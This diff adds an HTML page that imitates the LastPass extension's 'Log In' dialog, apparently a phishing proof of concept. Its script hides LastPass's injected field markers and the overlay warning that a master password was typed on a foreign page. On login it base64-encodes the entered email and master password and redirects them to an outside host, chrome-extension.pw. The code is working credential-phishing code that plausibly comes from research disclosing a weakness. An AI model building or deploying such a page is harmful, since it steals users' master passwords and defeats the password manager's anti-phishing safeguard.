@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Log In</title>
+        <link rel="stylesheet" type="text/css" href="newvaultGlobal.css">
+        <link rel="stylesheet" type="text/css" href="dialog.css">
+        <link rel="stylesheet" type="text/css" href="notifications.css">
+    </head>
+    <body class="tab dialogState" style="">
+        <div id="dialogLoadingOverlay" class="overlay"></div>
+        <div id="dragElement"></div>
+        <div class="notification" id="errorMessage">
+            <img src="images/vault_4.0/Error.png"><span class="title">ERROR: </span><span class="message"></span>
+            <div class="close midToneHover" title="Close"><img src="images/vault_4.0/Error_Close.png"></div>
+        </div>
+        <div class="notification" id="successMessage">
+            <img src="images/vault_4.0/Success.png"><span class="title">SUCCESS: </span><span class="message"></span>
+            <div class="close midToneHover" title="Close"><img src="images/vault_4.0/Success_Close.png"></div>
+        </div>
+        <div class="dialog" id="loginDialog" style="display: block; height: 429px;">
+            <div class="dialogHeader icon leftIcon">
+                <div class="dialogHeaderInner"><span class="dialogHeaderTitle"></span></div>
+            </div>
+            <div class="dialogContent dialogContentFixed" style="top: 50px;">
+                <div>
+                    <div id="loginView">
+                        <div class="dropdownContainer">
+                            <label class="label first">Email:</label>
+                            <div class="relative">
+                                <div class="dropdownHint"></div>
+                                <input class="dialogInput typeaheadDropdown" id="loginDialogEmail" dialogfield="email" type="text" spellcheck="false" autofocus>
+                            </div>
+                            <div class="dropdownMenu selectDropdownList">
+                                <ul></ul>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="label">Master Password:</label>
+                            <div class="relative">
+                                <input class="dialogInput inputCapsMatter" id="loginDialogPassword" dialogfield="password" type="password">
+                                <div class="showKeyboard" title="Use Virtual Keyboard"></div>
+                            </div>
+                            <a id="forgotPassword">Forgot your password?</a>
+                            <div class="clear"></div>
+                        </div>
+                        <div>
+                            <div class="checkboxContainer"><input id="loginDialogRememberEmail" class="checkbox" dialogfield="rememberEmail" type="checkbox"><label for="loginDialogRememberEmail">Remember Email</label></div>
+                            <div class="checkboxContainer"><input id="loginDialogRememberPassword" class="checkbox" dialogfield="rememberPassword" type="checkbox"><label for="loginDialogRememberPassword" id="loginDialogRememberPasswordLabel">Remember Password</label></div>
+                            <div class="checkboxContainer"><input id="loginDialogShowVault" class="checkbox" dialogfield="rememberShowVault" type="checkbox"><label for="loginDialogShowVault">Show Vault After Login</label></div>
+                        </div>
+                        <div class="buttons centerButtons"><button id="logInButton" class="nbtn rbtn">Log In</button></div>
+                        <p class="newToLastPass">New to LastPass?<a id="newToLastPass">Create an account now.</a></p>
+                    </div>
+                    <div id="confirmRememberPassword">
+                        <p>Are you sure?</p>
+                        <p>Using 'remember password' makes it easier to forget your password and decreases your security if your device is infected or stolen.</p>
+                        <div class="buttons centerButtons"><button class="nbtn btn_midi" id="confirmNo">No</button><button class="nbtn btn_midi rbtn" id="confirmYes">Yes</button></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <link type="text/css" rel="stylesheet" href="buttons.css">
+        <link type="text/css" rel="stylesheet" href="loginDialog.css">
+        <script>
+          var config = { childList: true };
+          var observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.addedNodes.length > 0) { 
+                  for (var i = 0; i < mutation.addedNodes.length; i++) {
+                    var item = mutation.addedNodes[i];
+                    if (item.id !== undefined) {
+                      //  This removes the asterisk on the email field
+                      if (item.id.startsWith("__lpform_")) {
+                        document.body.removeChild(item);
+                      }
+                      // This removes the "You've typed your master password in somewhere you dummy" notification
+                      else if (item.id.startsWith("lpiframeoverlay")) {
+                        var email = document.getElementById("loginDialogEmail");
+                        var password = document.getElementById("loginDialogPassword");
+                        if (email.value && password.value) {
+                          // TODO, actually just redirect to the attacker server now
+                          document.body.removeChild(item);
+                          alert("LastPass gave you away! Here is your email and password: " + email.value + " -> examplePW5");
+                        }
+                      }
+                    }
+                  }
+                }
+            });
+          });
+          observer.observe(document.body, config);
+
+          // Watch for style additions
+          var pwfield = document.getElementById("loginDialogPassword");
+          var styleConfig = { attributes: true };
+          var styleObserver = new MutationObserver(function(mutations) {
+              mutations.forEach(function(mutation) {
+                if (mutation.attributeName === "style" && mutation.target.style !== null && mutation.target.style.length > 0) {
+                  mutation.target.setAttribute("style", "");
+                }
+              });
+          });
+          styleObserver.observe(pwfield, styleConfig);
+
+          document.getElementById("logInButton").onclick = function() {
+            var email = document.getElementById("loginDialogEmail").value;
+            var password = document.getElementById("loginDialogPassword").value;
+            console.log(email, " -> ", password);
+            var encoded = window.btoa(email + ":" + password);
+            console.log("Redirecting to ", encoded);
+            window.location = "http://chrome-extension.pw/p/" + encoded;
+          };
+        </script>
+    </body>
+</html>
